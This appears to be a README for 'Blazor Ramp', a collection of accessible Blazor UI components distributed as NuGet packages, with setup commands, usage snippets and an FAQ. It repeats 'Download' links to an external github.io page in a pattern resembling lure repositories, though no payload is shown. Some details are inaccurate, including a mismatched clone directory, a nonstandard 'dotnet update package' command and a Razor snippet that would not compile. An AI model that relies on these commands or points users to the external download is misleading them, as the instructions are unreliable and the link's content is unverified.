# Blazor Ramp v1.0 – UI Components 2026

> **A modular collection of accessible-first Blazor components, each delivered as an independent NuGet package, enabling developers to build inclusive web apps with reduced overhead.**

[![Platform](https://img.shields.io/badge/Platform-Blazor-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v1.0-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bakerbrandon29/blazor-ramp-components?style=flat-square)](https://github.com/bakerbrandon29/blazor-ramp-components)

---

<p align="center">
  <a href="https://bakerbrandon29.github.io/blazor-ramp-components/">
    <img src="https://img.shields.io/badge/Download-Blazor%20Ramp%20Latest-brightgreen?style=for-the-badge" alt="Download Blazor Ramp">
  </a>
</p>

> **[Download Blazor Ramp v1.0](https://bakerbrandon29.github.io/blazor-ramp-components/)**

---

[Download Latest Build](https://bakerbrandon29.github.io/blazor-ramp-components/)

---

## Overview

Blazor Ramp delivers a set of thoughtfully designed UI components for Blazor applications. Every component follows accessibility best practices and ships as a standalone NuGet package so you can include exactly what your project requires. Whether you're constructing internal dashboards, public websites, or data-driven tools, these components provide a consistent experience while eliminating the need to rebuild common patterns.

Modularity and straightforward integration are at the core of this project. Developers can select individual widgets—such as a modal dialog, toggle switch, or pagination control—without committing to a large monolithic library. Each component works across standard Blazor hosting models, including WebAssembly and Server. This approach keeps dependencies lean and gives teams full control over their project's footprint.

## Key Features

- **Live Region Service** – Dynamically push content updates to assistive technologies.
- **Announcement History Component** – Maintain a log of live region announcements for debugging or user inspection.
- **Busy Indicator** – Display loading states with a flexible, customizable spinner or overlay.
- **Modal Dialog Framework** – Accessible modal windows featuring focus trapping and keyboard navigation.
- **Switch & Toggle Controls** – On/off toggles adhering to WAI-ARIA switch patterns.
- **Tabs & Accordion** – Organized content panels with keyboard interaction and expand/collapse behavior.
- **Toggletip & Skip-to Navigation** – Contextual help tooltips and skip links designed for keyboard users.
- **Debounce Filter & Pagination** – Efficient input filtering and page navigation for data-heavy interfaces.

## Setup

Clone the repository or install individual components through NuGet:

```bash
git clone https://github.com/bakerbrandon29/blazor-ramp-components.git
cd BlazorRamp-Components
```

To add a component to your Blazor project, use the NuGet package manager:

```bash
dotnet add package BlazorRamp.AnnouncementHistory
dotnet add package BlazorRamp.ModalDialog
```

After installation, register the service in `Program.cs`:

```csharp
builder.Services.AddBlazorRamp();
```

## Using the Components

Once registered, you can use components in your Razor pages:

```razor
<BlazorRampModal Title="Confirm Action">
    <Body>
        <p>Are you sure you want to proceed?</p>
    </Body>
    <Footer>
        <button @onclick="HandleCancel">Cancel</button>
        <button @onclick="HandleConfirm">Confirm</button>
    </Footer>
</BlazorRampModal>
```

For the live region service, inject `ILiveRegionService` and call `AnnounceAsync`:

```csharp
@inject ILiveRegionService LiveRegion

<button @onclick="() => LiveRegion.AnnounceAsync("Item saved")">Save</button>
```

## Configuration

Component settings live in a JSON configuration file located at `wwwroot/blazor-ramp.json` by default. You can adjust announcement durations, modal animation speeds, and pagination page sizes there. Alternatively, pass options directly when registering services:

```csharp
builder.Services.AddBlazorRamp(options => {
    options.AnnouncementTimeout = 3000;
    options.ModalCloseOnEscape = true;
});
```

## Requirements

- **Platform**: .NET 6+ Blazor (WebAssembly or Server)
- **Runtime**: Standard Blazor hosting environment
- **Storage**: Minimal – no database or external storage needed
- **Browser**: Modern browsers with JavaScript enabled (for interactive components)

## FAQ

**How do I update a single component without affecting the rest?**  
Each component is an independent NuGet package. Update only the ones you need using `dotnet update package`.

**Can I customize the look and feel?**  
Yes. Components rely on CSS variables and allow overrides. Include your own stylesheet after the default one.

**Does this support keyboard-only navigation?**  
All components are built with keyboard accessibility in mind, including focus management and ARIA attributes.

**Where can I report issues or suggest features?**  
Open an issue on the GitHub repository. Please include your Blazor version and the component package name.

## License

GNU GPL v3.0 – see [LICENSE](LICENSE) for details.
